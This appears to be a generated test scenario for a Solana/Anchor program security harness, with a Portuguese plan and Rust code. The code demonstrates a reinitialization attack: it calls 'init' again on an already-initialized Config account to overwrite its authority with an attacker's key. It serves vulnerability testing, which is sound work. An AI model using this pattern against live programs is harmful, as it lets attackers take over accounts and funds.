{"plan": "O cenário monta uma conta Config já inicializada (authority = chave legítima, is_initialized = true, vault_balance = 0) e chama init com um novo authority como baseline legítimo — mas como a conta já está inicializada, o baseline falharia. Em vez disso, o baseline usa uma conta Config não inicializada (is_initialized = false) para provar que o cenário está correto. O ataque reutiliza a mesma instrução init, mas passa a conta Config já inicializada (com is_initialized = true) e um authority diferente, tentando sobrescrever o estado. O efeito mede se, após o ataque, o campo authority foi alterado para a chave do atacante e/ou is_initialized permanece true, demonstrando a reinicialização.", "scenario": "let authority_legit = Pubkey::new_unique();
let authority_attacker = Pubkey::new_unique();

// Conta Config não inicializada para o baseline
let config_data = anchor_account_data("Config", &(authority_legit, false, 0u64));
let config_key = Pubkey::new_unique();
let config_account = account(&env.program_id, &config_data, None);

let contas_baseline = vec![
    (config_key, config_account.clone()),
    (authority_legit, wallet(1_000_000_000)),
];

let ix_baseline = env.anchor_ix("init", &(), vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(authority_legit, true),
]);

let r_baseline = env.baseline("init legitimo em conta nao inicializada", &ix_baseline, &contas_baseline);

// Ataque: reutiliza a mesma instrucao init, mas com a conta ja inicializada
// (estado resultante do baseline) e um authority diferente
let config_pos_baseline = after(&r_baseline, &config_key).clone();

let contas_ataque = vec![
    (config_key, config_pos_baseline),
    (authority_attacker, wallet(1_000_000_000)),
];

let ix_ataque = env.anchor_ix("init", &(), vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(authority_attacker, true),
]);

let r_ataque = env.attack("reinit: init em conta ja inicializada com novo authority", &ix_ataque, &contas_ataque);

if r_ataque.program_result == ProgramResult::Success {
    let dados = after(&r_ataque, &config_key).data();
    let authority_pos = read_pubkey(dados, 8);
    let is_init_pos = dados[40] != 0;
    env.effect("authority sobrescrito pelo atacante", authority_pos == authority_attacker);
    env.effect("conta permanece inicializada apos reinit", is_init_pos);
}"}

